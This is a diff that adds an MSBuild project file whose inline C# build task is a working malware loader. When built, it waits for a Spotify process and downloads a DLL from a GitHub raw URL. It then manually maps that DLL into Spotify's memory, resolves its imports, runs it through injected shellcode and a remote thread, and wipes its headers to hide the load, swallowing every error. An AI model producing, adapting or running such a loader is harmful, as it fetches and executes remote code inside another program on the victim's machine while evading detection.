@@ -1,0 +1,205 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <INJ />
+  </Target>
+  <UsingTask TaskName="INJ" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup/>
+    <Task>
+      <Reference Include="System.Core"/>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Threading;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class INJ : Task {
+    [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr OpenProcess(uint a,bool b,int c);
+    [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);
+    [DllImport("kernel32.dll",SetLastError=true)] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,IntPtr s,out IntPtr w);
+    [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint st,IntPtr fn,IntPtr p,uint f,out uint t);
+    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h,uint m);
+    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll")] static extern bool VirtualFreeEx(IntPtr h,IntPtr a,IntPtr s,uint t);
+    [DllImport("kernel32.dll",CharSet=CharSet.Ansi,SetLastError=true)] static extern IntPtr GetProcAddress(IntPtr h,string n);
+    [DllImport("kernel32.dll",CharSet=CharSet.Unicode,SetLastError=true)] static extern IntPtr GetModuleHandle(string n);
+    [DllImport("kernel32.dll",CharSet=CharSet.Ansi,SetLastError=true)] static extern IntPtr LoadLibraryA(string n);
+
+    static ushort R2(byte[] b,int o){return BitConverter.ToUInt16(b,o);}
+    static uint R4(byte[] b,int o){return BitConverter.ToUInt32(b,o);}
+    static ulong R8(byte[] b,int o){return BitConverter.ToUInt64(b,o);}
+    static void W8(byte[] b,int o,ulong v){b[o]=(byte)v;b[o+1]=(byte)(v>>8);b[o+2]=(byte)(v>>16);b[o+3]=(byte)(v>>24);b[o+4]=(byte)(v>>32);b[o+5]=(byte)(v>>40);b[o+6]=(byte)(v>>48);b[o+7]=(byte)(v>>56);}
+
+    static byte[] GetShellcode(){return new byte[]{0x48,0x83,0xEC,0x28,0x48,0x8B,0x41,0x08,0x4C,0x8B,0x01,0x49,0x8B,0xC8,0xBA,0x01,0x00,0x00,0x00,0x4D,0x31,0xC0,0xFF,0xD0,0x48,0x83,0xC4,0x28,0xC3};}
+
+    public override bool Execute(){
+        try{
+            Thread.Sleep(500);
+            Process[] procs=Process.GetProcessesByName("Spotify");
+            for(int i=0;i<30&&procs.Length==0;i++){Thread.Sleep(1000);procs=Process.GetProcessesByName("Spotify");}
+            if(procs.Length==0)return true;
+            int pid=procs[0].Id;
+
+            ServicePointManager.SecurityProtocol=(SecurityProtocolType)3072;
+            byte[] raw;
+            using(var wc=new WebClient()){raw=wc.DownloadData("https://raw.githubusercontent.com/washedluca1-lgtm/UDLIKEDMA/main/UDLDMAXYTRUS.dll");}
+            if(raw==null||raw.Length<0x200||R2(raw,0)!=0x5A4D)return true;
+
+            int nt=(int)R4(raw,0x3C);
+            if(R4(raw,nt)!=0x4550)return true;
+            
+            ushort numSec=R2(raw,nt+6);
+            ushort optSize=R2(raw,nt+20);
+            int optHdr=nt+24;
+            uint entryRVA=R4(raw,optHdr+16);
+            ulong imageBase=R8(raw,optHdr+24);
+            uint sizeOfImage=R4(raw,optHdr+56);
+            uint sizeOfHeaders=R4(raw,optHdr+60);
+            int ddStart=optHdr+112;
+            uint relocRVA=R4(raw,ddStart+40);
+            uint relocSize=R4(raw,ddStart+44);
+            uint importRVA=R4(raw,ddStart+8);
+            uint importSize=R4(raw,ddStart+12);
+            int secStart=nt+24+optSize;
+
+            IntPtr hp=OpenProcess(0x1F0FFF,false,pid);
+            if(hp==IntPtr.Zero)return true;
+
+            IntPtr pBase=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(sizeOfImage),0x3000,0x40);
+            if(pBase==IntPtr.Zero){CloseHandle(hp);return true;}
+
+            byte[] image=new byte[sizeOfImage];
+            Array.Copy(raw,0,image,0,(int)sizeOfHeaders);
+            
+            for(int i=0;i<numSec;i++){
+                int sh=secStart+i*40;
+                uint va=R4(raw,sh+12);
+                uint rawPtr=R4(raw,sh+20);
+                uint rawSize=R4(raw,sh+16);
+                if(rawSize>0&&rawPtr>0&&rawPtr+rawSize<=raw.Length){
+                    int copySize=(int)Math.Min(rawSize,sizeOfImage-va);
+                    if(copySize>0)Array.Copy(raw,(int)rawPtr,image,(int)va,copySize);
+                }
+            }
+
+            long delta=pBase.ToInt64()-(long)imageBase;
+            if(delta!=0&&relocRVA>0&&relocSize>0){
+                int pos=(int)relocRVA;
+                int end=(int)(relocRVA+relocSize);
+                while(pos<end&&pos+8<image.Length){
+                    uint pageRVA=R4(image,pos);
+                    uint blockSize=R4(image,pos+4);
+                    if(blockSize<8||blockSize>0x10000)break;
+                    int count=((int)blockSize-8)/2;
+                    for(int i=0;i<count;i++){
+                        ushort entry=R2(image,pos+8+i*2);
+                        int type=entry>>12;
+                        int off=entry&0xFFF;
+                        if(type==10){
+                            int addr=(int)pageRVA+off;
+                            if(addr+8<=image.Length){
+                                ulong val=R8(image,addr);
+                                W8(image,addr,(ulong)((long)val+delta));
+                            }
+                        }
+                    }
+                    pos+=(int)blockSize;
+                }
+            }
+
+            IntPtr k32=GetModuleHandle("kernel32.dll");
+            IntPtr pLoadLib=GetProcAddress(k32,"LoadLibraryA");
+            IntPtr written;
+
+            if(importRVA>0&&importSize>0){
+                int pos=(int)importRVA;
+                while(pos+20<=image.Length){
+                    uint nameRVA=R4(image,pos+12);
+                    if(nameRVA==0)break;
+                    StringBuilder sb=new StringBuilder();
+                    for(int j=(int)nameRVA;j<image.Length&&image[j]!=0;j++)sb.Append((char)image[j]);
+                    string modName=sb.ToString();
+                    
+                    byte[] nameBytes=Encoding.ASCII.GetBytes(modName+"\0");
+                    IntPtr pName=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(nameBytes.Length),0x3000,0x04);
+                    if(pName!=IntPtr.Zero){
+                        WriteProcessMemory(hp,pName,nameBytes,new IntPtr(nameBytes.Length),out written);
+                        uint tid;IntPtr ht=CreateRemoteThread(hp,IntPtr.Zero,0,pLoadLib,pName,0,out tid);
+                        if(ht!=IntPtr.Zero){WaitForSingleObject(ht,10000);CloseHandle(ht);}
+                        VirtualFreeEx(hp,pName,IntPtr.Zero,0x8000);
+                    }
+                    LoadLibraryA(modName);
+                    pos+=20;
+                }
+            }
+
+            if(importRVA>0&&importSize>0){
+                int pos=(int)importRVA;
+                while(pos+20<=image.Length){
+                    uint nameRVA=R4(image,pos+12);
+                    if(nameRVA==0)break;
+                    StringBuilder sb=new StringBuilder();
+                    for(int j=(int)nameRVA;j<image.Length&&image[j]!=0;j++)sb.Append((char)image[j]);
+                    IntPtr hMod=GetModuleHandle(sb.ToString());
+                    if(hMod!=IntPtr.Zero){
+                        uint ilt=R4(image,pos);
+                        uint iat=R4(image,pos+16);
+                        uint thunk=ilt!=0?ilt:iat;
+                        int ti=(int)thunk;
+                        int ai=(int)iat;
+                        while(ti+8<=image.Length&&ai+8<=image.Length){
+                            ulong entry=R8(image,ti);
+                            if(entry==0)break;
+                            IntPtr fn=IntPtr.Zero;
+                            if((entry&0x8000000000000000UL)!=0){
+                                fn=GetProcAddress(hMod,"#"+(entry&0xFFFF));
+                            }else{
+                                int hintRVA=(int)entry;
+                                if(hintRVA+2<image.Length){
+                                    StringBuilder fnName=new StringBuilder();
+                                    for(int j=hintRVA+2;j<image.Length&&image[j]!=0;j++)fnName.Append((char)image[j]);
+                                    fn=GetProcAddress(hMod,fnName.ToString());
+                                }
+                            }
+                            if(fn!=IntPtr.Zero)W8(image,ai,(ulong)fn.ToInt64());
+                            ti+=8;ai+=8;
+                        }
+                    }
+                    pos+=20;
+                }
+            }
+
+            WriteProcessMemory(hp,pBase,image,new IntPtr(image.Length),out written);
+
+            byte[] sc=GetShellcode();
+            IntPtr pSC=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(sc.Length),0x3000,0x40);
+            IntPtr pData=VirtualAllocEx(hp,IntPtr.Zero,new IntPtr(16),0x3000,0x04);
+
+            long entryPoint=pBase.ToInt64()+(long)entryRVA;
+            byte[] scData=new byte[16];
+            Array.Copy(BitConverter.GetBytes(pBase.ToInt64()),0,scData,0,8);
+            Array.Copy(BitConverter.GetBytes(entryPoint),0,scData,8,8);
+            WriteProcessMemory(hp,pData,scData,new IntPtr(16),out written);
+            WriteProcessMemory(hp,pSC,sc,new IntPtr(sc.Length),out written);
+
+            uint tid2;IntPtr ht2=CreateRemoteThread(hp,IntPtr.Zero,0,pSC,pData,0,out tid2);
+            if(ht2!=IntPtr.Zero){WaitForSingleObject(ht2,30000);CloseHandle(ht2);}
+
+            byte[] zeros=new byte[0x1000];
+            WriteProcessMemory(hp,pBase,zeros,new IntPtr(0x1000),out written);
+
+            Thread.Sleep(500);
+            VirtualFreeEx(hp,pSC,IntPtr.Zero,0x8000);
+            VirtualFreeEx(hp,pData,IntPtr.Zero,0x8000);
+            CloseHandle(hp);
+        }catch{}
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
